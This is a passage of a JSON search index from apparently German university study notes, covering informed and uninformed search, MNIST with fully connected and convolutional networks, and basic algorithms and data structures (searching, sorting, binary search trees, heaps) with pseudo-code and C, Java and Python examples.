A* f\u00fcr wenig Speicher (z.\u202fB. eingebettete Systeme) Weighted A* \u2705 Ja Hoch \u274c Nicht garantiert \u2705 Ja Sehr schnell Opfer zugunsten der Geschwindigkeit","tags":["Course/"]},{"location":"studium/AI/Problem%20L%C3%B6sen%20durch%20Suche/#merkhilfe","title":"\ud83e\udde0 Merkhilfe:","text":"Suche-Typ Nutzt <code>h(n)</code>? Beispiel Informiert \u2705 Ja A, Greedy, IDA Uninformiert \u274c Nein BFS, DFS, IDS","tags":["Course/"]},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/","title":"fcNN, CNN, Deep Learning Grundlagen","text":""},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#grundlagen-des-maschinellen-lernens","title":"Grundlagen des Maschinellen Lernens","text":""},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#erklarung","title":"\ud83d\udcd8 Erkl\u00e4rung:","text":"<p>Beim \u00fcberwachten Lernen (Supervised Learning) lernt ein Modell anhand von Eingabedaten (X) und den zugeh\u00f6rigen Zielwerten (Y), wie es Vorhersagen treffen kann.</p> <p>In der MNIST-Aufgabe: - Eingabe: 28x28-Bild von einer Zahl - Ziel: Welche Ziffer ist darauf zu sehen (z.\u202fB. 5)</p> <p>Wir unterteilen die Daten in: - Trainingsdaten - zum Lernen - Validierungsdaten - zur Kontrolle w\u00e4hrend des Trainings (tun wir \"zu viel\"?) - Testdaten - zur abschlie\u00dfenden Bewertung (wie gut ist das Modell bei neuen, unbekannten Bildern?)</p> <p>Wichtige Begriffe: - Loss-Funktion: misst den Fehler \u2192 z.\u202fB. <code>categorical_crossentropy</code> - Optimizer: passt die Gewichte an \u2192 z.\u202fB. <code>adam</code> - Epochen: wie oft das Modell alle Trainingsdaten durchl\u00e4uft - Batch-Gr\u00f6\u00dfe: Gibt an, wie viele Trainingsbeispiele gleichzeitig verarbeitet werden, bevor das Modell die Gewichte aktualisiert</p>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#1-was-ist-das-mnist-datenset","title":"1. \ud83d\udce6 Was ist das MNIST-Datenset?","text":"<ul> <li>Datensatz mit 60.000 Trainingsbildern und 10.000 Testbildern</li> <li>Bilder: 28x28 Pixel, Graustufen (Werte 0-255)</li> <li>Ziel: Ziffern 0 bis 9 automatisch erkennen</li> <li>Bilder werden auf Werte zwischen 0 und 1 normalisiert (<code>/255.0</code>)</li> <li>Labels werden in One-Hot-Encoding umgewandelt \u2192 z.\u202fB. 3 \u2192 <code>[0, 0, 0, 1, 0, ..., 0]</code></li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#2-fcnn-fully-connected-neural-network-multilayer-perceptron","title":"2. \ud83d\udd22 fcNN - Fully Connected Neural Network (Multilayer Perceptron)","text":""},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#aufbau","title":"\ud83d\udccc Aufbau:","text":"<ul> <li>Eingabedaten m\u00fcssen geflattet werden: 28\u00d728 \u2192 Vektor mit 784 Werten</li> <li>Besteht aus: <code>Dense</code>-Layern + Aktivierungsfunktionen (<code>sigmoid</code>, <code>relu</code>)</li> <li>Output-Layer: 10 Neuronen mit <code>softmax</code> f\u00fcr Wahrscheinlichkeiten</li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#eigenschaften","title":"\ud83d\udccc Eigenschaften:","text":"<ul> <li>Jede Verbindung zwischen den Neuronen wird trainiert</li> <li>R\u00e4umliche Struktur des Bildes geht verloren</li> <li>Erreicht ca. 97\u202f% Genauigkeit auf MNIST</li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#3-cnn-convolutional-neural-network","title":"3. \ud83e\udde0 CNN - Convolutional Neural Network","text":""},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#aufbau_1","title":"\ud83d\udccc Aufbau:","text":"<ul> <li>Arbeitet direkt mit 2D-Bildern (kein Flatten n\u00f6tig!)</li> <li>Typische Layer:<ul> <li><code>Conv2D</code>: erkennt lokale Muster mit kleinen Filtern (z.\u202fB. 3x3)</li> <li><code>MaxPooling2D</code>: reduziert Gr\u00f6\u00dfe, hebt wichtigste Infos hervor</li> <li><code>Flatten</code>: bereitet Ausgabe f\u00fcr Dense-Schichten vor</li> <li><code>Dense + softmax</code>: Klassifikation</li> </ul> </li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#warum-cnns-besser-fur-bilder-sind","title":"\ud83d\udccc Warum CNNs besser f\u00fcr Bilder sind:","text":"<ul> <li>Erkennen lokale Muster wie Kanten, Linien, Kreise</li> <li>Behalten r\u00e4umliche Lage bei</li> <li>Robust gegen\u00fcber Verschiebung von Ziffern im Bild</li> <li>Lernen tiefere, abstraktere Repr\u00e4sentationen</li> <li>Erreichen \u00fcber 99\u202f% Genauigkeit auf MNIST</li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#4-was-sind-lokale-muster-wie-erkennt-cnn-sie","title":"4. \ud83e\udde9 Was sind lokale Muster &amp; wie erkennt CNN sie?","text":""},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#lokale-muster","title":"\ud83d\udccc Lokale Muster:","text":"<ul> <li>Kleine visuelle Merkmale: z.\u202fB. Ecken, Striche, Kreise</li> <li>Ein Filter (3\u00d73 oder 5\u00d75) \u201escannt\u201c das Bild</li> <li>Multipliziert Filter &amp; Bildausschnitt \u2192 ergibt Feature Map</li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#cnn-schichten-lernen","title":"\ud83d\udccc CNN-Schichten lernen:","text":"<ul> <li>Fr\u00fche Layer: Kanten, einfache Muster</li> <li>Sp\u00e4tere Layer: Formen, Ziffern</li> <li>CNN erkennt was und wo ein Muster ist \u2192 fcNN nicht</li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#5-softmax-one-hot-encoding-und-optimizer","title":"5. \u2699\ufe0f Softmax, One-Hot-Encoding und Optimizer","text":""},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#softmax","title":"\u2705 Softmax:","text":"<ul> <li>Wandelt Roh-Ausgaben des Netzes in Wahrscheinlichkeiten um</li> <li>Beispiel: <code>[2.3, 5.1, -1.2]</code> \u2192 <code>[0.1, 0.89, 0.01]</code></li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#one-hot-encoding","title":"\u2705 One-Hot-Encoding:","text":"<ul> <li>Wandelt Zielklassen in Vektoren mit genau einer 1 an der richtigen Stelle um</li> <li>Wird f\u00fcr die Loss-Berechnung mit <code>categorical_crossentropy</code> ben\u00f6tigt</li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#optimizer-adam","title":"\u2705 Optimizer (<code>adam</code>):","text":"<ul> <li>Berechnet, wie die Gewichte ge\u00e4ndert werden m\u00fcssen, um den Fehler zu minimieren</li> <li>Adam ist schnell, effizient und selbstanpassend</li> </ul>"},{"location":"studium/AI/fcNN%2C%20CNN%2C%20Deep%20Learning%20Grundlagen/#6-trainingsmetriken-auswertung","title":"6. \ud83d\udcca Trainingsmetriken &amp; Auswertung","text":"<ul> <li>Accuracy: Anteil korrekt klassifizierter Bilder</li> <li>Loss: Ma\u00df f\u00fcr den Vorhersagefehler</li> <li>Confusion Matrix: Zeigt, welche Klassen wie oft verwechselt wurden</li> <li>Trainingsverlauf (Plots): visualisiert Lernfortschritt</li> </ul>"},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/","title":"Algorithmen und Datenstruktur","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#algorithmen-und-datenstruktur","title":"Algorithmen und Datenstruktur","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#einfuhrung-in-algorithmen-und-datenstrukturen","title":"Einf\u00fchrung in Algorithmen und Datenstrukturen","text":"<p>Ein Algorithmus ist eine systematische Methode zur L\u00f6sung eines Problems in endlich vielen Schritten. Er kann als Rezept oder Anleitung verstanden werden.</p> <p>Eine Datenstruktur ist eine M\u00f6glichkeit, Daten effizient zu speichern und zu organisieren.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#2-suchalgorithmen","title":"\ud83d\udd0d 2. Suchalgorithmen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#21-lineare-suche","title":"2.1 Lineare Suche","text":"<ul> <li>Die einfachste Methode zur Suche in einer Liste.</li> <li>Durchl\u00e4uft alle Elemente nacheinander.</li> <li>Laufzeit: O(n) im Worst Case.</li> </ul> \ud83d\udd0d Pseudo-Code\ud83d\udcdd C-Code\u2615 Java-Code\ud83d\udc0d Python-Code <pre><code>FUNKTION lineare_suche(arr, ziel):\nF\u00dcR jedes Element i in arr:\n    WENN arr[i] == ziel:\n        GIB i zur\u00fcck // Index des gesuchten Elements\n    GIB -1 zur\u00fcck // Falls Element nicht gefunden\n</code></pre> <pre><code>// Lineare Suche in einem Array\n// n=Array Size\nint lineare_suche(int arr[], int n, int ziel) {\n    for (int i = 0; i &lt; n; i++) {\n        if (arr[i] == ziel)\n            return i;  // Index des gefundenen Elements\n    }\n    return -1;  // Nicht gefunden\n}\n</code></pre> <pre><code>// Lineare Suche in einem Array\npublic static int lineareSuche(int[] arr, int ziel) {\n    for (int i = 0; i &lt; arr.length; i++) {\n        if (arr[i] == ziel) {\n            return i;  // Index des gefundenen Elements\n        }\n    }\n    return -1;  // Nicht gefunden\n}\n</code></pre> <pre><code># Lineare Suche in einer Liste\ndef lineare_suche(arr, ziel):\n    for i in range(len(arr)):\n        if arr[i] == ziel:\n            return i  # Index des gefundenen Elements\n    return -1  # Nicht gefunden\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#22-binare-suche-binary-search","title":"2.2 Bin\u00e4re Suche (Binary Search)","text":"<ul> <li>Funktioniert nur bei sortierten Listen/Arrays.</li> <li>Durchsucht die Liste durch wiederholtes Halbieren des Suchbereichs.</li> <li>Laufzeit: O(log\u2061n)O(\\log n)O(logn) im Worst Case (logarithmische Komplexit\u00e4t).</li> </ul> \ud83d\udd0d Pseudo-Code\ud83d\udcdd C-Code\u2615 Java-Code\ud83d\udc0d Python-Code <pre><code>FUNKTION binaere_suche(arr, links, rechts, ziel):\n    W\u00c4HREND links &lt;= rechts:\n        mitte = (links + rechts) / 2\n        WENN arr[mitte] == ziel:\n            GIB mitte zur\u00fcck // Index des gesuchten Elements\n        SONST WENN arr[mitte] &lt; ziel:\n            links = mitte + 1  // Suche im rechten Teil\n        SONST:\n            rechts = mitte - 1  // Suche im linken Teil\n    GIB -1 zur\u00fcck // Falls Element nicht gefunden\n</code></pre> <pre><code>int binaere_suche(int arr[], int links, int rechts, int ziel) {\n    while (links &lt;= rechts) {\n        int mitte = links + (rechts - links) / 2;\n\n        if (arr[mitte] == ziel)\n            return mitte;  // Element gefunden\n\n        if (arr[mitte] &lt; ziel)\n            links = mitte + 1;  // Suche im rechten Teil\n        else\n            rechts = mitte - 1;  // Suche im linken Teil\n    }\n    return -1;  // Element nicht gefunden\n}\n</code></pre> <pre><code>public class BinarySearch {\n    public static int binaereSuche(int[] arr, int ziel) {\n        int links = 0, rechts = arr.length - 1;\n\n        while (links &lt;= rechts) {\n            int mitte = links + (rechts - links) / 2;\n\n            if (arr[mitte] == ziel)\n                return mitte;  // Element gefunden\n\n            if (arr[mitte] &lt; ziel)\n                links = mitte + 1;  // Suche im rechten Teil\n            else\n                rechts = mitte - 1;  // Suche im linken Teil\n        }\n        return -1;  // Element nicht gefunden\n    }\n</code></pre> <pre><code>def binaere_suche(arr, ziel):\n    links, rechts = 0, len(arr) - 1\n\n    while links &lt;= rechts:\n        mitte = (links + rechts) // 2\n\n        if arr[mitte] == ziel:\n            return mitte  # Element gefunden\n        elif arr[mitte] &lt; ziel:\n            links = mitte + 1  # Suche im rechten Teil\n        else:\n            rechts = mitte - 1  # Suche im linken Teil\n\n    return -1  # Element nicht gefunden\n\n# Beispiel\narr = [1, 3, 5, 7, 9, 11, 13]\nziel = 7\nergebnis = binaere_suche(arr, ziel)\n\nif ergebnis != -1:\n    print(f\"Element gefunden an Index {ergebnis}\")\nelse:\n    print(\"Element nicht gefunden\")\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#3-sortieralgorithmen","title":"\ud83d\uddc3\ufe0f3.  Sortieralgorithmen","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#31-bubble-sort","title":"3.1 Bubble Sort","text":"<ul> <li>Vergleicht benachbarte Elemente und vertauscht sie.</li> <li>Sehr ineffizient bei gro\u00dfen Datenmengen: O(n\u00b2) Laufzeit.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#schritt-fur-schritt","title":"\ud83d\udd22 Schritt-f\u00fcr-Schritt","text":"<ol> <li>Durchlaufe die Liste mehrfach.</li> <li>Vergleiche benachbarte Elemente.</li> <li>Tausche sie, falls das linke gr\u00f6\u00dfer ist als das rechte.</li> <li>Wiederholen, bis keine Vertauschung mehr n\u00f6tig ist.</li> </ol> \ud83d\udd0d Pseudo-Code\ud83d\udcdd C-Code\u2615 Java-Code\ud83d\udc0d Python-Code <pre><code>FUNKTION bubble_sort(arr):\nF\u00dcR i von 0 bis L\u00e4nge(arr) - 1:\n    F\u00dcR j von 0 bis L\u00e4nge(arr) - i - 1:\n        WENN arr[j] &gt; arr[j+1]:\n            TAUSCHE arr[j] und arr[j+1]\n</code></pre> <pre><code>void bubble_sort(int arr[], int n) { \n    for (int i = 0; i &lt; n - 1; i++) {\n        for (int j = 0; j &lt; n - i - 1; j++) {\n            if (arr[j] &gt; arr[j + 1]) {\n                // Elemente tauschen\n                int temp = arr[j];\n                arr[j] = arr[j + 1];\n                arr[j + 1] = temp;\n            }\n        }\n    }\n}\n</code></pre> <pre><code>// Bubble Sort in Java\npublic static void bubbleSort(int[] arr) {\n    int n = arr.length;\n    for (int i = 0; i &lt; n - 1; i++) {\n        for (int j = 0; j &lt; n - i - 1; j++) {\n            if (arr[j] &gt; arr[j + 1]) {\n                // Elemente tauschen\n                int temp = arr[j];\n                arr[j] = arr[j + 1];\n                arr[j + 1] = temp;\n            }\n        }\n    }\n}\n</code></pre> <pre><code># Bubble Sort in Python\ndef bubble_sort(arr):\n    n = len(arr)\n    for i in range(n):\n        for j in range(0, n - i - 1):\n            if arr[j] &gt; arr[j + 1]:\n                arr[j], arr[j + 1] = arr[j + 1], arr[j]\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#32-quicksort","title":"3.2 Quicksort","text":"<ul> <li>Ein effizienter Divide &amp; Conquer Algorithmus.</li> <li>W\u00e4hlt ein Pivot-Element, partitioniert die Liste und sortiert rekursiv.</li> <li>Laufzeit: O(n log n) im Durchschnitt.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#schritt-fur-schritt_1","title":"\ud83d\ude80 Schritt-f\u00fcr-Schritt","text":"<ol> <li>W\u00e4hle ein Pivot-Element (z. B. das letzte Element).</li> <li>Partitioniere die Liste:<ul> <li>Elemente kleiner als Pivot.</li> <li>Das Pivot-Element.</li> <li>Elemente gr\u00f6\u00dfer als Pivot.</li> </ul> </li> <li>Rufe Quicksort rekursiv f\u00fcr die beiden Partitionen auf.</li> </ol> \ud83d\udd0d Pseudo-Code\ud83d\udcdd C-Code\u2615 Java-Code\ud83d\udc0d Python-Code <pre><code>FUNKTION quicksort(arr, low, high):\nWENN low &lt; high:\n    pivot = PARTITION(arr, low, high)\n    quicksort(arr, low, pivot - 1)\n    quicksort(arr, pivot + 1, high)\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n\nvoid swap(int *a, int *b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\n\nint partition(int arr[], int low, int high) {\n    int pivot = arr[high];\n    int i = (low - 1);\n    for (int j = low; j &lt; high; j++) {\n        if (arr[j] &lt; pivot) {\n            i++;\n            swap(&amp;arr[i], &amp;arr[j]);\n        }\n    }\n    swap(&amp;arr[i + 1], &amp;arr[high]);\n    return (i + 1);\n}\n\nvoid quicksort(int arr[], int low, int high) {\n    if (low &lt; high) {\n        int pi = partition(arr, low, high);\n        quicksort(arr, low, pi - 1);\n        quicksort(arr, pi + 1, high);\n    }\n}\n</code></pre> <pre><code>public static void quicksort(int[] arr, int low, int high) {\n    if (low &lt; high) {\n        int pi = partition(arr, low, high);\n        quicksort(arr, low, pi - 1);\n        quicksort(arr, pi + 1, high);\n    }\n}\n\nprivate static int partition(int[] arr, int low, int high) {\n    int pivot = arr[high];\n    int i = (low - 1);\n    for (int j = low; j &lt; high; j++) {\n        if (arr[j] &lt; pivot) {\n            i++;\n            int temp = arr[i];\n            arr[i] = arr[j];\n            arr[j] = temp;\n        }\n    }\n    int temp = arr[i + 1];\n    arr[i + 1] = arr[high];\n    arr[high] = temp;\n    return i + 1;\n}\n</code></pre> <pre><code># Bubble Sort in Python\ndef bubble_sort(arr):\n    n = len(arr)\n    for i in range(n):\n        for j in range(0, n - i - 1):\n            if arr[j] &gt; arr[j + 1]:\n                arr[j], arr[j + 1] = arr[j + 1], arr[j]\n</code></pre> <p>In unserem grafischen Beispiel: <code>Pivot = Array[Array size / 2]</code> </p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#4-baume","title":"\ud83c\udf33 4. B\u00e4ume","text":"<p>Ein Baum ist eine hierarchische Datenstruktur mit Knoten. Der oberste Knoten wird als Wurzel bezeichnet.</p>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#41-binare-suchbaume-bst","title":"4.1 Bin\u00e4re Suchb\u00e4ume (BST)","text":"<ul> <li>Jeder Knoten hat h\u00f6chstens zwei Kinder.</li> <li>Linkes Kind: kleiner als der Elternknoten.</li> <li>Rechtes Kind: gr\u00f6\u00dfer als der Elternknoten.</li> <li>Effizient f\u00fcr Suchen, Einf\u00fcgen, L\u00f6schen: O(log n).</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#einfugen-in-einen-bst","title":"\ud83c\udf31 Einf\u00fcgen in einen BST","text":"<ol> <li>Leerer Baum: Das Element wird die Wurzel.</li> <li>Wert &lt; Knoten: Gehe nach links.</li> <li>Wert &gt; Knoten: Gehe nach rechts.</li> <li>Finde die richtige Position und f\u00fcge ein.</li> </ol> \ud83d\udd0d Pseudo-Code\ud83d\udcdd C-Code\u2615 Java-Code\ud83d\udc0d Python-Code <pre><code>FUNKTION einfuegen(knoten, wert):\n    WENN knoten == NULL:\n        GIB neuen Knoten(wert) zur\u00fcck\n    WENN wert &lt; knoten.wert:\n        knoten.links = einfuegen(knoten.links, wert)\n    ANDERNFALLS:\n        knoten.rechts = einfuegen(knoten.rechts, wert)\n    GIB knoten zur\u00fcck\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct Node {\n    int data;\n    struct Node* left;\n    struct Node* right;\n};\n\nstruct Node* newNode(int data) {\n    struct Node* node = (struct Node*)malloc(sizeof(struct Node));\n    node-&gt;data = data;\n    node-&gt;left = node-&gt;right = NULL;\n    return node;\n}\n\nstruct Node* insert(struct Node* root, int data) {\n    if (root == NULL) return newNode(data);\n    if (data &lt; root-&gt;data)\n        root-&gt;left = insert(root-&gt;left, data);\n    else\n        root-&gt;right = insert(root-&gt;right, data);\n    return root;\n}\n</code></pre> <pre><code>class Node {\n    int data;\n    Node left, right;\n\n    public Node(int item) {\n        data = item;\n        left = right = null;\n    }\n}\n\npublic Node insert(Node root, int data) {\n    if (root == null) {\n        root = new Node(data);\n        return root;\n    }\n    if (data &lt; root.data)\n        root.left = insert(root.left, data);\n    else\n        root.right = insert(root.right, data);\n    return root;\n}\n</code></pre> <pre><code>class Node:\n    def __init__(self, data):\n        self.data = data\n        self.left = None\n        self.right = None\n\ndef insert(root, data):\n    if root is None:\n        return Node(data)\n    if data &lt; root.data:\n        root.left = insert(root.left, data)\n    else:\n        root.right = insert(root.right, data)\n    return root\n</code></pre>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#5-heaps-und-prioritatswarteschlangen","title":"\ud83d\uddc3\ufe0f 5. Heaps und Priorit\u00e4tswarteschlangen","text":"<p>Ein Heap ist eine spezielle Bin\u00e4rbaum-Datenstruktur:</p> <ul> <li>Ein Min-Heap hat die Eigenschaft: Der kleinste Wert ist an der Wurzel.</li> <li>Ein Max-Heap hat die Eigenschaft: Der gr\u00f6\u00dfte Wert ist an der Wurzel.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#heap-operationen","title":"Heap-Operationen","text":"<ul> <li>Einf\u00fcgen: Element wird am Ende eingef\u00fcgt und \u201enach oben geblubbert\u201c.</li> <li>Entfernen des Minimums: Wurzel entfernen, letztes Element nach oben setzen und \u201enach unten sinken\u201c.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#max-heap-einfugen-und-entfernen","title":"Max-Heap (Einf\u00fcgen und Entfernen)","text":"<ul> <li>Eigenschaften:<ul> <li>Vollst\u00e4ndiger Bin\u00e4rbaum (alle Ebenen sind vollst\u00e4ndig gef\u00fcllt, au\u00dfer evtl. der letzten).</li> <li>Elternknoten ist gr\u00f6\u00dfer oder gleich seinen Kindknoten (Max-Heap-Eigenschaft).</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#schritt-fur-schritt-einfugen-in-einen-max-heap","title":"Schritt-f\u00fcr-Schritt: Einf\u00fcgen in einen Max-Heap","text":"<ol> <li>F\u00fcge das neue Element am Ende des Heaps ein.</li> <li>\"Heapify Up\": Vergleiche das Element mit seinem Elternknoten.</li> <li>Falls es gr\u00f6\u00dfer ist, tausche die beiden. kleiner bei Min-Heap</li> <li>Wiederholen, bis die Max-Heap-Eigenschaft erf\u00fcllt ist.</li> </ol>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#warum-ist-die-suche-in-einem-heap-ineffizient","title":"Warum ist die Suche in einem Heap ineffizient?","text":"<p>In einem Heap gilt die Heap-Eigenschaft:</p> <ul> <li>Min-Heap: Eltern \u2264 Kinder</li> <li>Max-Heap: Eltern \u2265 Kinder</li> </ul> <p>Das bedeutet:</p> <ul> <li>Wir wissen nur, dass der Wurzelknoten der kleinste (Min-Heap) oder gr\u00f6\u00dfte (Max-Heap) ist.</li> <li>Aber wir wissen nicht, wie die anderen Elemente zueinander stehen.</li> <li>Keine vollst\u00e4ndige Sortierung \u2192 Wir k\u00f6nnen nicht gezielt links oder rechts gehen.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#suchstrategien-im-heap","title":"Suchstrategien im Heap","text":"","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#methode-1-breitensuche-bfs","title":"Methode 1: Breitensuche (BFS)","text":"<ul> <li>Level f\u00fcr Level durchsuchen (wie eine Warteschlange).</li> <li>Gut, wenn die gesuchte Zahl nah an der Wurzel liegt.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#methode-2-tiefensuche-dfs","title":"Methode 2: Tiefensuche (DFS)","text":"<ul> <li>Rekursiv nach links und rechts gehen.</li> <li>Praktisch, wenn der Baum gro\u00df ist.</li> </ul>","tags":["Course/"]},{"location":"studium/Algorithmen%20und%20Datenstruktur/1.%20Grundlagen/#typische-anwendungsfalle","title":"Typische Anwendungsf\u00e4lle:","text":"<ol> <li> <p>Priorit\u00e4tswarteschlangen (Priority Queues):</p> <ul> <li>Wenn du Aufgaben nach ihrer Wichtigkeit verarbeiten willst.</li> <li>Beispiel: Betriebssysteme verwalten Prozesse mit unterschiedlichen Priorit\u00e4ten.<ul> <li>\u2192 Immer der h\u00f6chste Priorit\u00e4tsprozess l\u00e4uft zuerst (Min-/Max-Heap).</li> </ul> </li> </ul> </li> <li> <p>Dijkstra-Algorithmus (k\u00fcrzeste Wege in Graphen):</p> <ul> <li>Heap wird verwendet, um den n\u00e4chsten Knoten mit der k\u00fcrzesten Distanz schnell zu finden. Mit Min-Heap</li> <li>Ohne Heap w\u00e4re dieser Algorithmus viel langsamer.</li> </ul> </li> <li> <p>Heapsort (Sortieralgorithmus):</p> <ul> <li>Effizienter Sortieralgorithmus mit \\(O(n \\log n)\\) Laufzeit.</li> <li>Besser als Bubble Sort oder Insertion Sort.</li> </ul> </li> <li> <p>Echtzeit-Systeme:</p> <ul> <li>Echtzeitspiele, Simulationen, Event-Handling \u2192 Aufgaben werden nach Priorit\u00e4t sortiert.</li> </ul> </li> <li> <p>Median-Findung (Streaming-Daten):</p> <ul> <li>Kombination aus Min-Heap und Max-Heap hilft, den Median von Datenstr\u00f6men effizient zu berechnen.</li> </ul> </li> </ol> \ud83d\udd0d Pseudo-Code\ud83d\udcdd C-Code\u2615 Java-Code\ud83d\udc0d Python-Code <pre><code>FUNKTION insert(heap, wert):\n    heap.F\u00dcGE_HINZU(wert)\n    index = LETZTER_INDEX(heap)\n    W\u00c4HREND index &gt; 0 UND heap[ELTERN(index)] &lt; heap[index]:\n        TAUSCHE heap[index] UND heap[ELTERN(index)]\n        index = ELTERN(index)\n</code></pre> <pre><code>#include &lt;stdio.h&gt;\n\n// Hilfsfunktion zum Tauschen von zwei Elementen\nvoid swap(int *a, int *b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\n\n// \"Heapify\"-Funktion f\u00fcr einen Max-Heap\nvoid heapify(int arr[], int n, int i) {\n    int largest = i;       // Initialisiere das gr\u00f6\u00dfte Element als Wurzel\n    int left = 2 * i + 1;  // Linkes Kind\n    int right = 2 * i + 2; // Rechtes Kind\n\n    // Vergleiche linkes Kind mit der Wurzel\n    if (left &lt; n &amp;&amp; arr[left] &gt; arr[largest])\n        largest = left;\n\n    // Vergleiche rechtes Kind mit dem aktuell gr\u00f6\u00dften\n    if (right &lt; n &amp;&amp; arr[right] &gt; arr[largest])\n        largest = right;\n\n    // Falls das gr\u00f6\u00dfte Element nicht die Wurzel ist, tausche sie\n    if (largest != i) {\n        swap(&amp;arr[i], &amp;arr[largest]);\n        heapify(arr, n, largest); // Rekursiv heapify anwenden\n    }\n}\n\n// Heapsort-Algorithmus\nvoid heapsort(int arr[], int n) {\n    // Max-Heap erstellen\n    for (int i = n / 2 - 1; i &gt;= 0; i--)\n        heapify(arr, n, i);\n\n    // Elemente sortieren\n    for (int i = n - 1; i &gt;= 0; i--) {\n        swap(&amp;arr[0], &amp;arr[i]);  // Wurzel ans Ende verschieben\n        heapify(arr, i, 0);      // Heapify auf den reduzierten Heap anwenden\n    }\n}\n\n// Hilfsfunktion zum Drucken des Arrays\nvoid printArray(int arr[], int n) {\n    for (int i = 0; i &lt; n; i++)\n        printf(\"%d \", arr[i]);\n    printf(\"\\n\");\n}\n\nint main() {\n    int arr[] = {4, 10, 3, 5, 1};\n    int n = sizeof(arr) / sizeof(arr[0]);\n\n    heapsort(arr, n);\n\n    printf(\"Sortiertes Array: \");\n    printArray(arr, n);\n\n    return 0;\n}\n</code></pre> <pre><code>    public class HeapSort {\n\n    // Hilfsfunktion zum \"Heapify\"-Prozess\n    public static void heapify(int[] arr, int n, int i) {\n        int largest = i;           // Wurzel\n        int left = 2 * i + 1;      // Linkes Kind\n        int right = 2 * i + 2;     // Rechtes Kind\n\n        // Linkes Kind gr\u00f6\u00dfer als Wurzel?\n        if (left &lt; n &amp;&amp; arr[left] &gt; arr[largest])\n            largest = left;\n\n        // Rechtes Kind gr\u00f6\u00dfer als das gr\u00f6\u00dfte Element?\n        if (right &lt; n &amp;&amp; arr[right] &gt; arr[largest])\n            largest = right;\n\n        // Falls das gr\u00f6\u00dfte Element nicht die Wurzel ist, tauschen\n        if (largest != i) {\n            int temp = arr[i];\n            arr[i] = arr[largest];\n            arr[largest] = temp;\n\n            // Rekursives Heapify\n            heapify(arr, n, largest);\n        }\n    }\n\n    // Heapsort-Algorithmus\n    public static void heapSort(int[] arr) {\n        int n = arr.length;\n\n        // Max-Heap erstellen\n        for (int i = n / 2 - 1; i &gt;= 0; i--)\n            heapify(arr, n, i);\n\n        // Heap sortieren\n        for (int i = n - 1; i &gt; 0; i--) {\n            // Wurzel (gr\u00f6\u00dftes Element) ans Ende verschieben\n            int temp = arr[0];\n            arr[0] = arr[i];\n            arr[i] = temp;\n\n            // Heapify auf den verkleinerten Heap anwenden\n            heapify(arr, i, 0);\n        }\n    }\n\n    // Hilfsfunktion zum Ausgeben des Arrays\n    public static void printArray(int[] arr) 